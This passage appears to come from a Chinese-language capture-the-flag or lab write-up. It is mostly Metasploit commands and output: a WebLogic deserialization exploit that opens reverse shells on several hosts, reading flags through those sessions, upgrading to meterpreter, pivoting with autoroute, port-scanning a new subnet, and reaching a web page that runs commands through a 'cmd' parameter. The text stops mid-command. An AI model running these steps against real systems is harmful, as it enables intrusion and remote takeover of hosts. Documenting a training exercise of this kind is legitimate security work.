class="language-bash">查看可配置参数列表</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Name       Current Setting               Required  Description</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   ----       ---------------               --------  -----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   Proxies                                  no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   RHOSTS                                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   RPORT      7001                          <span class="built_in">yes</span>       The target port (TCP)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   SSL        <span class="literal">false</span>                         no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   TARGETURI  /_async/AsyncResponseService  <span class="built_in">yes</span>       URL to AsyncResponseService</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   VHOST                                    no        HTTP server virtual host</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Payload options (cmd/unix/reverse_bash):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Name   Current Setting  Required  Description</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exploit target:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Id  Name</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   --  ----</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   0   Unix</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别设置不同的RHOSTS攻击</span></span><br><span class="line">set RHOSTS 192.171.84.2</span><br><span class="line">set RHOSTS 192.171.84.3</span><br><span class="line">set RHOSTS 192.171.84.4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置lhost</span></span><br><span class="line">set lhost 192.168.172.128</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别 run</span></span><br><span class="line">run -j</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看打开的反向Shell</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Active sessions</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">===============</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   Id  Name  Type                   Information          Connection</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  --  ----  ----                   -----------          ----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  1         shell cmd/unix                              192.168.172.128:4444 -&gt; 192.171.84.5:39212 (192.168.172.128)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  2         meterpreter x86/linux  root @ 192.171.84.5  192.168.172.128:4433 -&gt; 192.171.84.5:37818 (192.168.172.128)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  3         shell cmd/unix                              192.168.172.128:4444 -&gt; 192.171.84.2:44310 (192.171.84.2)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  4         shell cmd/unix                              192.168.172.128:4444 -&gt; 192.171.84.3:48286 (192.171.84.3)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  5         shell cmd/unix                              192.168.172.128:4444 -&gt; 192.172.85.4:37296 (192.171.84.4)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get flag2-4</span></span><br><span class="line">sessions -c "ls /tmp" -i 3,4,5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[*] Running <span class="string">'ls /tmp'</span> on shell session 3 (192.171.84.2)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bea1061393648233859820.tmp</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cookie.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flag-{bmh72f110f7-e1fb-4e67-8a11-40c8b4024c5d}</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hsperfdata_root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">packages</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wlstTemproot</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># [*] Running 'ls /tmp' on shell session 4 (192.171.84.3)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bea1061393648233859820.tmp</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cookie.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flag-{bmha5f01ddb-551d-4f7e-a630-323180cdba0a}</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hsperfdata_root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">packages</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wlstTemproot</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># [*] Running 'ls /tmp' on shell session 5 (192.171.84.4)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bea1061393648233859820.tmp</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cookie.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flag-{bmhcf14ca31-3adf-4458-ae9e-84773b89b38f}</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hsperfdata_root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">packages</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wlstTemproot</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="13-获取flag5"><a href="#13-获取flag5" class="headerlink" title="13.获取flag5"></a>13.获取flag5</h1><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"># 通过网卡、路由、ARP 发现新子网 <span class="number">192.169</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">sessions -c <span class="string">"ifconfig"</span> -i <span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"> </span><br><span class="line"># [*] Running <span class="string">'ifconfig'</span> on shell session <span class="number">3</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.2</span>)</span><br><span class="line"># eth0      Link encap:Ethernet  HWaddr <span class="number">02</span>:<span class="number">42</span>:c0:ab:<span class="number">54</span>:<span class="number">02</span>  </span><br><span class="line">#           inet addr:<span class="number">192.171</span><span class="number">.84</span><span class="number">.2</span>  Bcast:<span class="number">192.171</span><span class="number">.84</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">#           UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">846</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">55</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">#           RX bytes:<span class="number">42809</span> (<span class="number">42.8</span> KB)  TX bytes:<span class="number">5375</span> (<span class="number">5.3</span> KB)</span><br><span class="line"># </span><br><span class="line"># lo        Link encap:Local Loopback  </span><br><span class="line">#           inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">#           UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">#           RX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)  TX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)</span><br><span class="line"># </span><br><span class="line"># </span><br><span class="line"># [*] Running <span class="string">'ifconfig'</span> on shell session <span class="number">4</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.3</span>)</span><br><span class="line"># eth0      Link encap:Ethernet  HWaddr <span class="number">02</span>:<span class="number">42</span>:c0:ab:<span class="number">54</span>:<span class="number">03</span>  </span><br><span class="line">#           inet addr:<span class="number">192.171</span><span class="number">.84</span><span class="number">.3</span>  Bcast:<span class="number">192.171</span><span class="number">.84</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">#           UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">822</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">39</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">#           RX bytes:<span class="number">39909</span> (<span class="number">39.9</span> KB)  TX bytes:<span class="number">2926</span> (<span class="number">2.9</span> KB)</span><br><span class="line"># </span><br><span class="line"># lo        Link encap:Local Loopback  </span><br><span class="line">#           inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">#           UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">#           RX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)  TX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)</span><br><span class="line"># </span><br><span class="line">#</span><br><span class="line"># [*] Running <span class="string">'ifconfig'</span> on shell session <span class="number">5</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>)</span><br><span class="line"># eth0      Link encap:Ethernet  HWaddr <span class="number">02</span>:<span class="number">42</span>:c0:ac:<span class="number">55</span>:<span class="number">03</span>  </span><br><span class="line">#           inet addr:<span class="number">192.172</span><span class="number">.85</span><span class="number">.3</span>  Bcast:<span class="number">192.172</span><span class="number">.85</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">#           UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">30</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">9</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">#           RX bytes:<span class="number">2220</span> (<span class="number">2.2</span> KB)  TX bytes:<span class="number">651</span> (<span class="number">651.0</span> B)</span><br><span class="line"># </span><br><span class="line"># eth1      Link encap:Ethernet  HWaddr <span class="number">02</span>:<span class="number">42</span>:c0:ab:<span class="number">54</span>:<span class="number">05</span>  </span><br><span class="line">#           inet addr:<span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>  Bcast:<span class="number">192.171</span><span class="number">.84</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">#           UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">793</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">11</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">#           RX bytes:<span class="number">35643</span> (<span class="number">35.6</span> KB)  TX bytes:<span class="number">770</span> (<span class="number">770.0</span> B)</span><br><span class="line"># </span><br><span class="line"># lo        Link encap:Local Loopback  </span><br><span class="line">#           inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">#           UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">#           RX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">#           TX packets:<span class="number">6</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">#           collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">#           RX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)  TX bytes:<span class="number">328</span> (<span class="number">328.0</span> B)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 发现新的网段<span class="number">192.172</span><span class="number">.85</span><span class="number">.3</span></span><br><span class="line"># 将会话<span class="number">5</span>升级为 meterpreter shell</span><br><span class="line">sessions -u <span class="number">5</span></span><br><span class="line"># 查看打开的反向Shell</span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"># Active sessions</span><br><span class="line"># ===============</span><br><span class="line"># </span><br><span class="line">#   Id  Name  Type                   Information          Connection</span><br><span class="line">#   --  ----  ----                   -----------          ----------</span><br><span class="line">#   <span class="number">1</span>         shell cmd/unix                              <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.171</span><span class="number">.84</span><span class="number">.5</span>:<span class="number">39212</span> (<span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>)</span><br><span class="line">#   <span class="number">2</span>         meterpreter x86/linux  root @ <span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>  <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4433</span> -&gt; <span class="number">192.171</span><span class="number">.84</span><span class="number">.5</span>:<span class="number">37818</span> (<span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>)</span><br><span class="line">#   <span class="number">3</span>         shell cmd/unix                              <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.171</span><span class="number">.84</span><span class="number">.2</span>:<span class="number">44310</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.2</span>)</span><br><span class="line">#   <span class="number">4</span>         shell cmd/unix                              <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.171</span><span class="number">.84</span><span class="number">.3</span>:<span class="number">48286</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.3</span>)</span><br><span class="line">#   <span class="number">5</span>         shell cmd/unix                              <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.172</span><span class="number">.85</span><span class="number">.4</span>:<span class="number">37296</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>)</span><br><span class="line">#   <span class="number">6</span>         meterpreter x86/linux  root @ <span class="number">192.172</span><span class="number">.85</span><span class="number">.3</span>  <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>:<span class="number">4433</span> -&gt; <span class="number">192.172</span><span class="number">.85</span><span class="number">.4</span>:<span class="number">44160</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 进入会话<span class="number">6</span></span><br><span class="line">sessions -i <span class="number">6</span></span><br><span class="line"># 查看路由器</span><br><span class="line">route</span><br><span class="line"></span><br><span class="line"># IPv4 network routes</span><br><span class="line"># ===================</span><br><span class="line"># </span><br><span class="line">#     Subnet        Netmask        Gateway       Metric  Interface</span><br><span class="line">#     ------        -------        -------       ------  ---------</span><br><span class="line">#     <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>        <span class="number">192.172</span><span class="number">.85</span><span class="number">.1</span>  <span class="number">0</span>       eth0</span><br><span class="line">#     <span class="number">192.171</span><span class="number">.84</span><span class="number">.0</span>  <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0</span>       eth1</span><br><span class="line">#     <span class="number">192.172</span><span class="number">.85</span><span class="number">.0</span>  <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0</span>       eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将新发现的子网加入Pivot Route</span><br><span class="line">run autoroute -s <span class="number">192.172</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"># 查看Pivot Route</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line"># Active Routing Table</span><br><span class="line"># ====================</span><br><span class="line"># </span><br><span class="line">#    Subnet             Netmask            Gateway</span><br><span class="line">#    ------             -------            -------</span><br><span class="line">#    <span class="number">192.171</span><span class="number">.84</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">2</span></span><br><span class="line">#    <span class="number">192.172</span><span class="number">.85</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ctrl+z后台运行</span><br><span class="line"></span><br><span class="line"># 使用端口扫描工具</span><br><span class="line">use scanner/portscan/tcp</span><br><span class="line"># 设置RHOSTS和ports</span><br><span class="line">set RHOSTS <span class="number">192.172</span><span class="number">.85</span><span class="number">.2</span><span class="number">-254</span></span><br><span class="line">set ports <span class="number">80</span></span><br><span class="line"># 开始扫描</span><br><span class="line">run</span><br><span class="line"># 查看发现的服务列表</span><br><span class="line">services</span><br><span class="line"></span><br><span class="line"># Services</span><br><span class="line"># ========</span><br><span class="line"># </span><br><span class="line"># host             port  proto  name  state   info</span><br><span class="line"># ----             ----  -----  ----  -----   ----</span><br><span class="line"># <span class="number">192.168</span><span class="number">.172</span><span class="number">.128</span>  <span class="number">9937</span>  tcp          closed</span><br><span class="line"># <span class="number">192.171</span><span class="number">.84</span><span class="number">.2</span>     <span class="number">7001</span>  tcp          open</span><br><span class="line"># <span class="number">192.171</span><span class="number">.84</span><span class="number">.3</span>     <span class="number">7001</span>  tcp          open</span><br><span class="line"># <span class="number">192.171</span><span class="number">.84</span><span class="number">.4</span>     <span class="number">7001</span>  tcp          open</span><br><span class="line"># <span class="number">192.172</span><span class="number">.85</span><span class="number">.2</span>     <span class="number">80</span>    tcp          open</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 发现终点靶标 <span class="number">192.172</span><span class="number">.85</span><span class="number">.2</span> <span class="number">80</span>(tcp)</span><br><span class="line"></span><br><span class="line"># 利用跳板机的shell会话访问最终靶标</span><br><span class="line">sessions -c <span class="string">"curl http://192.172.85.2"</span> -i <span class="number">6</span></span><br><span class="line"></span><br><span class="line"># /bin/sh: <span class="number">1</span>: curl: not found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 发现没安装curl，试试wget</span><br><span class="line">sessions -c <span class="string">"wget http://192.172.85.2"</span> -i <span class="number">6</span></span><br><span class="line"></span><br><span class="line"># [*] Running <span class="string">'wget http://192.172.85.2'</span> on meterpreter session <span class="number">6</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.5</span>)</span><br><span class="line"># -<span class="number">-2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">02</span>:<span class="number">04</span>--  http:<span class="comment">//192.172.85.2/</span></span><br><span class="line"># Connecting to <span class="number">192.172</span><span class="number">.85</span><span class="number">.2</span>:<span class="number">80.</span>.. connected.</span><br><span class="line"># HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"># Length: unspecified [text/html]</span><br><span class="line"># Saving to: <span class="string">'index.html'</span></span><br><span class="line"># </span><br><span class="line">#      <span class="number">0</span>K                                                        <span class="number">95.7</span>K=<span class="number">0</span>s</span><br><span class="line"># </span><br><span class="line"># <span class="number">2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">02</span>:<span class="number">05</span> (<span class="number">95.7</span> KB/s) - <span class="string">'index.html'</span> saved [<span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 发现没有命令执行回显，试试组合命令</span><br><span class="line">sessions -c <span class="string">"wget http://192.172.85.2 -O /tmp/result &amp;&amp; cat /tmp/result"</span> -i <span class="number">6</span></span><br><span class="line"></span><br><span class="line"># [*] Running <span class="string">'wget http://192.172.85.2 -O /tmp/result &amp;&amp; cat /tmp/result'</span> on meterpreter session <span class="number">6</span> (<span class="number">192.171</span><span class="number">.84</span><span class="number">.5</span>)</span><br><span class="line"># -<span class="number">-2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">03</span>:<span class="number">19</span>--  http:<span class="comment">//192.172.85.2/</span></span><br><span class="line"># Connecting to <span class="number">192.172</span><span class="number">.85</span><span class="number">.2</span>:<span class="number">80.</span>.. connected.</span><br><span class="line"># HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"># Length: unspecified [text/html]</span><br><span class="line"># Saving to: <span class="string">'/tmp/result'</span></span><br><span class="line"># </span><br><span class="line">#      <span class="number">0</span>K                                                        <span class="number">3.13</span>M=<span class="number">0</span>s</span><br><span class="line"># </span><br><span class="line"># <span class="number">2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">03</span>:<span class="number">19</span> (<span class="number">3.13</span> MB/s) - <span class="string">'/tmp/result'</span> saved [<span class="number">21</span>]</span><br><span class="line"># </span><br><span class="line"># index.php?cmd=ls /tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 发现 get flag 提示</span><br><span class="line">sessions -c <span class="string">"wget 'http://192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/result &amp;&amp; cat /tmp/result"</span> -i <span class="number">6</span></span><br><span class="line"></span><br><span class="line"># [*] Running <span class="string">'wget '</span>http:<span class="comment">//192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/result &amp;&amp; cat /tmp/result' on meterpreter session 6 (192.171.84.5)</span></span><br><span class="line"># -<span class="number">-2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">03</span>:<span class="number">55</span>--  http:<span class="comment">//192.172.85.2/index.php?cmd=ls%20/tmp</span></span><br><span class="line"># Connecting to <span 